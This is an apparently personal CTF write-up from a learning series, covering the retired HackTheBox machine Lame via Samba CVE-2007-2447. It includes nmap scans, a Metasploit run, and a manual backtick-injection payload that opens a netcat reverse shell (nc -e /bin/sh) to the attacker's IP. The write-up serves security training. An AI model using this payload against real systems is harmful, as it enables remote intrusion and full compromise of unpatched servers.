# Day 041 - CTF Writeup: HackTheBox (Easy Machine)

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

CTF writeups are one of the most valuable things you can publish as a security professional.

They demonstrate:
- Methodical thinking under pressure
- Tool proficiency across the full attack chain
- Ability to communicate technical findings clearly
- Real hands-on experience - not just course completion

Today: a full writeup of an easy HackTheBox machine following the PTES methodology from Day 21. Every command. Every decision. Every mistake.

> **Note:** Replace `<TARGET_IP>` with the actual machine IP from your HackTheBox VPN connection. Machine: **Lame** (retired, free with writeups available).

---

## 🎯 Machine: Lame

```
Platform:   HackTheBox
Difficulty: Easy
OS:         Linux
Points:     20
Release:    14 Mar 2017
Retired:    26 May 2017
```

Lame is one of HackTheBox's oldest machines. Deliberately vulnerable to a well-known Samba exploit. Perfect for practising methodology end-to-end.

---

## Phase 1 - Reconnaissance

### Nmap Scan

```bash
# Initial quick scan
nmap -sV -sC -T4 <TARGET_IP> -oN nmap_initial.txt

# Full port scan (all 65535)
nmap -p- -T4 <TARGET_IP> -oN nmap_allports.txt
```

**Results:**
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled
```

**Analysis:**
- vsftpd 2.3.4 - has a backdoor (CVE-2011-2523). Tried it, didn't work on this machine.
- OpenSSH 4.7p1 - very old version
- Samba 3.0.20 - **this is interesting**. Searchsploit time.

### Searchsploit

```bash
searchsploit samba 3.0.20
```

**Output:**
```
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
unix/remote/16320.rb
```

CVE-2007-2447. The username map script vulnerability. Metasploit has a module for it.

---

## Phase 2 - Exploitation

### Metasploit

```bash
msfconsole -q

msf6 > search samba usermap
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > show options

msf6 exploit(usermap_script) > set RHOSTS <TARGET_IP>
msf6 exploit(usermap_script) > set LHOST <YOUR_VPN_IP>
msf6 exploit(usermap_script) > run
```

**Output:**
```
[*] Started reverse TCP double handler on 192.168.1.x:4444
[*] Accepted the first client connection...
[*] Command shell session 1 opened

whoami
root
```

Direct root. No privilege escalation needed.

---

## Phase 3 - Post-Exploitation

```bash
# Confirm access
whoami
# root

id
# uid=0(root) gid=0(root)

hostname
# lame

# Get user flag
find / -name "user.txt" 2>/dev/null
cat /home/makis/user.txt
# [USER FLAG]

# Get root flag
cat /root/root.txt
# [ROOT FLAG]

# Quick system survey
uname -a
# Linux lame 2.6.24-16-server

ip a
# Internal IP addresses

cat /etc/passwd | grep -v nologin
# makis:x:1000:1000::/home/makis:/bin/bash
```

---

## 🗺️ Attack Chain

```
Nmap → Samba 3.0.20 identified
         ↓
Searchsploit → CVE-2007-2447 (username map script)
         ↓
Metasploit → usermap_script module
         ↓
Root shell - direct, no privesc needed
         ↓
user.txt + root.txt captured
```

---

## 📖 Lessons Learned

**What went well:**
- Methodology was clean - recon → identify → verify → exploit
- Recognised Samba 3.0.20 as an old version worth investigating
- Searchsploit found the exploit quickly

**What I'd do differently:**
- Should have tried the manual exploit (CVE-2007-2447 without Metasploit) to build skills
- Didn't enumerate SMB shares with enum4linux before jumping to exploitation
- Skipped checking FTP for anonymous login

**Manual exploitation (without Metasploit):**

The vulnerability allows command injection via the username parameter in Samba's MS-RPC interface:

```bash
# The payload - backtick command injection in username
smbclient //TARGET_IP/tmp -U "./=`nohup nc -e /bin/sh YOUR_IP 4444`"
# or
smb: \> logon "./=`nohup nc -e /bin/sh YOUR_IP 4444`"

# Listener on Kali
nc -lvnp 4444
```

Understanding the manual method matters - OSCP prohibits Metasploit for most machines.

---

## 🔑 Key Takeaways

- Old Samba versions (3.0.20) are consistently found in CTFs and real environments
- Always run Searchsploit on every identified service version
- Metasploit is efficient but learn manual exploits too
- Getting root directly happens more in CTFs - real engagements usually require privesc
- Document every step even when it's straightforward - report writing needs the receipts

---

## 📚 Resources
- [HackTheBox - Lame official writeup](https://www.hackthebox.com/)
- [CVE-2007-2447 details](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- [IppSec Lame walkthrough (YouTube)](https://www.youtube.com/watch?v=7dSS2-tCQFk)

---

## [⬅️ Day 040](../day040/) | [➡️ Day 042](../day042/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*